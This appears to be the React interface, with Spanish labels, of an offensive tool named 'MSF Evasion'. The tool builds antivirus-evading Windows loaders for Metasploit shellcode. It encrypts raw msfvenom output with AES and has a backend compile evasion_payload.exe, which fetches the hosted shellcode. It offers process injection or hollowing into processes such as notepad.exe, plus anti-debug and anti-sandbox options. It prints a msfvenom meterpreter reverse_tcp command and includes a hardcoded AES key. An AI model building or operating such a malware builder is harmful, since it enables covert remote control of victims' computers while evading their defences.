import React, { useState, useRef } from "react";
import {
  Shield,
  Download,
  Loader2,
  CheckCircle,
  AlertCircle,
  Copy,
  RefreshCw,
  ChevronDown,
  ChevronUp,
  Link,
  Key,
  Cpu,
  Terminal,
  Eye,
  EyeOff,
  Upload,
  FileCode,
} from "lucide-react";

// ─── Paleta ───────────────────────────────────────────────────────────────────
const BG     = "#0d1117";
const CARD   = "#161b22";
const BORDER = "#21262d";
const ACTIVE = "#388bfd";

// ─── Sub-componentes ──────────────────────────────────────────────────────────
function SectionTitle({ icon: Icon, label, color = "#58a6ff" }) {
  return (
    <div className="flex items-center gap-2 mb-4">
      <Icon size={14} style={{ color }} />
      <span className="text-xs font-semibold uppercase tracking-widest" style={{ color }}>
        {label}
      </span>
    </div>
  );
}

function OptionCard({ selected, onClick, label, description, badge }) {
  return (
    <button
      onClick={onClick}
      className="w-full text-left px-4 py-3 rounded-lg border transition-all duration-150 font-mono text-sm"
      style={{
        background: selected ? "rgba(56,139,253,0.1)" : "rgba(22,27,34,0.8)",
        borderColor: selected ? ACTIVE : BORDER,
        boxShadow: selected ? `0 0 0 1px ${ACTIVE}40` : "none",
      }}
    >
      <div className="flex items-center justify-between">
        <div>
          <span className="font-semibold" style={{ color: selected ? "#79c0ff" : "#e6edf3" }}>
            {label}
          </span>
          {description && (
            <p className="text-xs mt-0.5" style={{ color: "#6e7681" }}>{description}</p>
          )}
        </div>
        {badge && (
          <span
            className="text-xs px-2 py-0.5 rounded-full font-medium"
            style={{ background: "rgba(188,140,255,0.15)", color: "#bc8cff", border: "1px solid rgba(188,140,255,0.3)" }}
          >
            {badge}
          </span>
        )}
      </div>
    </button>
  );
}

function Toggle({ value, onChange, label, description }) {
  return (
    <div
      className="flex items-center justify-between py-3"
      style={{ borderBottom: `1px solid ${BORDER}` }}
    >
      <div>
        <p className="text-sm font-medium" style={{ color: "#e6edf3" }}>{label}</p>
        {description && (
          <p className="text-xs mt-0.5" style={{ color: "#6e7681" }}>{description}</p>
        )}
      </div>
      <button
        onClick={() => onChange(!value)}
        className="relative inline-flex h-5 w-9 items-center rounded-full transition-colors shrink-0"
        style={{ background: value ? "#238636" : "#30363d" }}
      >
        <span
          className="inline-block h-3.5 w-3.5 transform rounded-full bg-white transition-transform"
          style={{ transform: value ? "translateX(18px)" : "translateX(2px)" }}
        />
      </button>
    </div>
  );
}

function InputField({ label, value, onChange, placeholder, type = "text", mono = true }) {
  return (
    <div>
      <label className="block text-xs font-medium mb-1.5" style={{ color: "#8b949e" }}>
        {label}
      </label>
      <input
        type={type}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        className={`w-full px-3 py-2 rounded-lg text-sm outline-none transition-all ${mono ? "font-mono" : ""}`}
        style={{
          background: "#0d1117",
          border: `1px solid ${BORDER}`,
          color: "#e6edf3",
        }}
        onFocus={(e) => (e.target.style.borderColor = ACTIVE)}
        onBlur={(e) => (e.target.style.borderColor = BORDER)}
      />
    </div>
  );
}

// ─── Componente principal ─────────────────────────────────────────────────────
const defaultConfig = {
  encryption_key: "TMeV7BU5Vkr08ksRq6+a/LAQ3RwtIvACB/ygVFamDsU=",
  server_url: "",
  injection_type: "ProcessInjection",
  target_process: "C:\\Windows\\System32\\notepad.exe",
  evasive_mode: true,
};

export default function Evasion() {
  const [config, setConfig] = useState(defaultConfig);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState(null);
  const [showPreview, setShowPreview] = useState(false);
  const [shellcodeFile, setShellcodeFile] = useState(null);
  const [encrypting, setEncrypting] = useState(false);
  const [encryptSuccess, setEncryptSuccess] = useState(false);
  const [encryptError, setEncryptError] = useState(null);
  const fileInputRef = useRef(null);

  const set = (field, value) => {
    setConfig((prev) => ({ ...prev, [field]: value }));
    setSuccess(false);
    setError(null);
  };

  const validate = () => {
    if (!config.server_url.trim()) return "La URL del shellcode es requerida";
    if (!config.encryption_key.trim()) return "La clave de cifrado es requerida";
    if (!config.target_process.trim()) return "El proceso objetivo es requerido";
    return null;
  };

  const handleGenerate = async () => {
    const validationError = validate();
    if (validationError) { setError(validationError); return; }

    setLoading(true);
    setError(null);
    setSuccess(false);

    try {
      const res = await fetch("http://localhost:5000/generar-evasion", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(config),
      });

      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        throw new Error(data.detalle || `Error ${res.status}`);
      }

      const blob = await res.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "evasion_payload.exe";
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
      setSuccess(true);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const handleEncryptShellcode = async () => {
    if (!shellcodeFile) return;
    if (!config.encryption_key.trim()) {
      setEncryptError("Configurá primero la clave AES abajo");
      return;
    }
    setEncrypting(true);
    setEncryptSuccess(false);
    setEncryptError(null);
    try {
      const formData = new FormData();
      formData.append("shellcode", shellcodeFile);
      formData.append("encryption_key", config.encryption_key);
      const res = await fetch("http://localhost:5000/cifrar-shellcode", {
        method: "POST",
        body: formData,
      });
      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        throw new Error(data.error || `Error ${res.status}`);
      }
      const blob = await res.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "shell_encrypted.bin";
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
      setEncryptSuccess(true);
    } catch (err) {
      setEncryptError(err.message);
    } finally {
      setEncrypting(false);
    }
  };

  const previewJson = JSON.stringify(config, null, 2);

  return (
    <div className="min-h-full" style={{ background: BG }}>

      {/* ── Header sticky ── */}
      <div
        className="sticky top-0 z-10 px-6 py-4 border-b"
        style={{ background: `${BG}e8`, borderColor: BORDER, backdropFilter: "blur(8px)" }}
      >
        <div className="max-w-5xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Shield size={18} style={{ color: "#bc8cff" }} />
            <div>
              <h1 className="text-base font-bold" style={{ color: "#e6edf3" }}>
                MSF Evasion
              </h1>
              <p className="text-xs" style={{ color: "#6e7681" }}>
                Genera un loader con evasión de AV para shellcode de Metasploit
              </p>
            </div>
          </div>
          <button
            onClick={() => { setConfig(defaultConfig); setSuccess(false); setError(null); }}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition-colors"
            style={{ background: "#21262d", color: "#8b949e", border: `1px solid ${BORDER}` }}
          >
            <RefreshCw size={11} />
            Restablecer
          </button>
        </div>
      </div>

      <div className="max-w-5xl mx-auto px-6 py-6">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">

          {/* ── Panel izquierdo: configuración ── */}
          <div className="lg:col-span-2 space-y-5">

            {/* Cifrar Shellcode */}
            <div className="rounded-xl border p-5" style={{ background: CARD, borderColor: BORDER }}>
              <SectionTitle icon={Upload} label="Cifrar Shellcode" color="#bc8cff" />
              <div className="space-y-4">
                <div
                  className="flex items-start gap-2 text-xs px-3 py-2 rounded-lg"
                  style={{ background: "rgba(88,166,255,0.08)", border: "1px solid rgba(88,166,255,0.2)", color: "#8b949e" }}
                >
                  <Terminal size={12} className="mt-0.5 shrink-0" style={{ color: "#58a6ff" }} />
                  <span>
                    Generá el shellcode raw con msfvenom, cifralo acá con la clave AES, y hosteá el <span className="font-mono" style={{ color: "#79c0ff" }}>shell_encrypted.bin</span> resultante.
                    Ejemplo: <span className="font-mono" style={{ color: "#79c0ff" }}>
                      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=Y -f raw -o shell.bin
                    </span>
                  </span>
                </div>

                <div>
                  <label className="block text-xs font-medium mb-1.5" style={{ color: "#8b949e" }}>
                    Archivo shellcode (.bin raw de msfvenom)
                  </label>
                  <div className="flex gap-2">
                    <input
                      ref={fileInputRef}
                      type="file"
                      accept=".bin,.raw"
                      className="hidden"
                      onChange={(e) => {
                        setShellcodeFile(e.target.files[0] || null);
                        setEncryptSuccess(false);
                        setEncryptError(null);
                      }}
                    />
                    <button
                      onClick={() => fileInputRef.current?.click()}
                      className="flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-mono transition-all"
                      style={{
                        background: "#0d1117",
                        border: `1px solid ${shellcodeFile ? ACTIVE : BORDER}`,
                        color: shellcodeFile ? "#79c0ff" : "#6e7681",
                        flex: 1,
                        textAlign: "left",
                        minWidth: 0,
                      }}
                    >
                      <FileCode size={12} style={{ color: shellcodeFile ? "#58a6ff" : "#484f58", flexShrink: 0 }} />
                      <span className="truncate">
                        {shellcodeFile ? shellcodeFile.name : "Seleccionar archivo..."}
                      </span>
                    </button>
                    <button
                      onClick={handleEncryptShellcode}
                      disabled={!shellcodeFile || encrypting}
                      className="flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-semibold transition-all disabled:opacity-40 disabled:cursor-not-allowed whitespace-nowrap"
                      style={{
                        background: encryptSuccess ? "rgba(63,185,80,0.15)" : "rgba(188,140,255,0.15)",
                        border: `1px solid ${encryptSuccess ? "rgba(63,185,80,0.4)" : "rgba(188,140,255,0.4)"}`,
                        color: encryptSuccess ? "#3fb950" : "#bc8cff",
                      }}
                    >
                      {encrypting ? (
                        <Loader2 size={12} className="animate-spin" />
                      ) : encryptSuccess ? (
                        <CheckCircle size={12} />
                      ) : (
                        <Download size={12} />
                      )}
                      {encrypting ? "Cifrando..." : encryptSuccess ? "Descargado" : "Cifrar y Descargar"}
                    </button>
                  </div>
                  {encryptError && (
                    <p className="text-xs mt-1.5 font-mono" style={{ color: "#f85149" }}>{encryptError}</p>
                  )}
                  {encryptSuccess && (
                    <p className="text-xs mt-1.5 font-mono" style={{ color: "#3fb950" }}>
                      shell_encrypted.bin descargado — hostealo y copiá la URL abajo
                    </p>
                  )}
                </div>
              </div>
            </div>

            {/* Shellcode URL */}
            <div className="rounded-xl border p-5" style={{ background: CARD, borderColor: BORDER }}>
              <SectionTitle icon={Link} label="URL del Shellcode Cifrado" color="#58a6ff" />
              <InputField
                label="URL donde hosteaste el shell_encrypted.bin"
                value={config.server_url}
                onChange={(v) => set("server_url", v)}
                placeholder="https://cdn.ejemplo.com/shell_encrypted.bin"
              />
            </div>

            {/* Cifrado */}
            <div className="rounded-xl border p-5" style={{ background: CARD, borderColor: BORDER }}>
              <SectionTitle icon={Key} label="Cifrado AES" color="#d29922" />
              <InputField
                label="Clave AES-256 (Base64)"
                value={config.encryption_key}
                onChange={(v) => set("encryption_key", v)}
                placeholder="TMeV7BU5Vkr08ksRq6+a/LAQ3RwtIvACB/ygVFamDsU="
              />
            </div>

            {/* Inyección */}
            <div className="rounded-xl border p-5" style={{ background: CARD, borderColor: BORDER }}>
              <SectionTitle icon={Cpu} label="Tipo de Inyección" color="#bc8cff" />
              <div className="space-y-2">
                <OptionCard
                  selected={config.injection_type === "ProcessInjection"}
                  onClick={() => set("injection_type", "ProcessInjection")}
                  label="Process Injection"
                  description="Inyecta shellcode en un proceso existente"
                  badge="Clásico"
                />
                <OptionCard
                  selected={config.injection_type === "ProcessHollowing"}
                  onClick={() => set("injection_type", "ProcessHollowing")}
                  label="Process Hollowing"
                  description="Reemplaza el código de un proceso legítimo"
                  badge="Sigiloso"
                />
              </div>

              <div className="mt-4">
                <InputField
                  label="Proceso objetivo"
                  value={config.target_process}
                  onChange={(v) => set("target_process", v)}
                  placeholder="C:\Windows\System32\notepad.exe"
                />
              </div>
            </div>

            {/* Opciones de evasión */}
            <div className="rounded-xl border p-5" style={{ background: CARD, borderColor: BORDER }}>
              <SectionTitle icon={Shield} label="Opciones de Evasión" color="#3fb950" />
              <Toggle
                value={config.evasive_mode}
                onChange={(v) => set("evasive_mode", v)}
                label="Modo Evasivo"
                description="Activa anti-debug, anti-sandbox y ofuscación de syscalls"
              />
            </div>
          </div>

          {/* ── Panel derecho: preview + acción ── */}
          <div className="space-y-5">

            {/* Preview JSON */}
            <div className="rounded-xl border overflow-hidden" style={{ background: CARD, borderColor: BORDER }}>
              {/* Titlebar estilo terminal */}
              <div
                className="flex items-center justify-between px-4 py-2.5 select-none"
                style={{ background: "#1c2128", borderBottom: `1px solid ${BORDER}` }}
              >
                <div className="flex gap-1.5">
                  <div className="w-2.5 h-2.5 rounded-full bg-red-500/70" />
                  <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/70" />
                  <div className="w-2.5 h-2.5 rounded-full bg-green-500/70" />
                </div>
                <span className="text-xs font-mono" style={{ color: "#6e7681" }}>config.json</span>
                <button
                  onClick={() => {
                    navigator.clipboard.writeText(previewJson).catch(() => {});
                  }}
                  className="transition-colors"
                  style={{ color: "#6e7681" }}
                  title="Copiar"
                >
                  <Copy size={12} />
                </button>
              </div>

              {/* JSON highlight básico */}
              <div className="p-4 overflow-auto max-h-64 text-xs font-mono" style={{ color: "#8b949e" }}>
                {previewJson.split("\n").map((line, i) => {
                  const keyMatch = line.match(/^(\s*)"([^"]+)":/);
                  const valMatch = line.match(/:\s*(".*"|true|false|\d+)/);
                  return (
                    <div key={i}>
                      {keyMatch ? (
                        <>
                          <span>{line.slice(0, keyMatch.index + keyMatch[1].length)}</span>
                          <span style={{ color: "#79c0ff" }}>"{keyMatch[2]}"</span>
                          <span>:{valMatch ? " " : ""}</span>
                          {valMatch && (
                            <span style={{ color: typeof config[keyMatch[2]] === "boolean" ? "#d29922" : "#a5d6ff" }}>
                              {valMatch[1]}
                            </span>
                          )}
                        </>
                      ) : (
                        <span>{line}</span>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Resumen */}
            <div
              className="rounded-xl border p-4 text-xs font-mono space-y-2"
              style={{ background: CARD, borderColor: BORDER }}
            >
              <p className="text-xs font-semibold uppercase tracking-widest mb-3" style={{ color: "#6e7681" }}>
                Resumen
              </p>
              {[
                { label: "Inyección", value: config.injection_type },
                { label: "Proceso", value: config.target_process.split("\\").pop() },
                { label: "Evasión", value: config.evasive_mode ? "Activada" : "Desactivada", color: config.evasive_mode ? "#3fb950" : "#6e7681" },
                { label: "URL", value: config.server_url ? "✓ Configurada" : "✗ Vacía", color: config.server_url ? "#3fb950" : "#f85149" },
                { label: "AES Key", value: config.encryption_key ? "✓ Configurada" : "✗ Vacía", color: config.encryption_key ? "#3fb950" : "#f85149" },
              ].map(({ label, value, color }) => (
                <div key={label} className="flex items-center justify-between">
                  <span style={{ color: "#484f58" }}>{label}</span>
                  <span style={{ color: color || "#8b949e" }}>{value}</span>
                </div>
              ))}
            </div>

            {/* Error / Success */}
            {error && (
              <div
                className="flex items-start gap-2 px-4 py-3 rounded-xl border text-xs"
                style={{ background: "rgba(248,81,73,0.08)", borderColor: "#f851494d", color: "#ffa198" }}
              >
                <AlertCircle size={13} className="mt-0.5 shrink-0" />
                <span>{error}</span>
              </div>
            )}
            {success && (
              <div
                className="flex items-center gap-2 px-4 py-3 rounded-xl border text-xs"
                style={{ background: "rgba(63,185,80,0.08)", borderColor: "rgba(63,185,80,0.3)", color: "#3fb950" }}
              >
                <CheckCircle size={13} className="shrink-0" />
                evasion_payload.exe descargado correctamente
              </div>
            )}

            {/* Botón generar */}
            <button
              onClick={handleGenerate}
              disabled={loading}
              className="w-full flex items-center justify-center gap-2 py-3 px-5 rounded-xl font-semibold text-sm transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
              style={{
                background: loading
                  ? "#21262d"
                  : "linear-gradient(135deg, #6e40c9 0%, #8b5cf6 100%)",
                color: "#ffffff",
                boxShadow: loading ? "none" : "0 0 20px rgba(139,92,246,0.35)",
              }}
            >
              {loading ? (
                <>
                  <Loader2 size={16} className="animate-spin" />
                  Compilando...
                </>
              ) : (
                <>
                  <Download size={16} />
                  Compilar y Descargar
                </>
              )}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
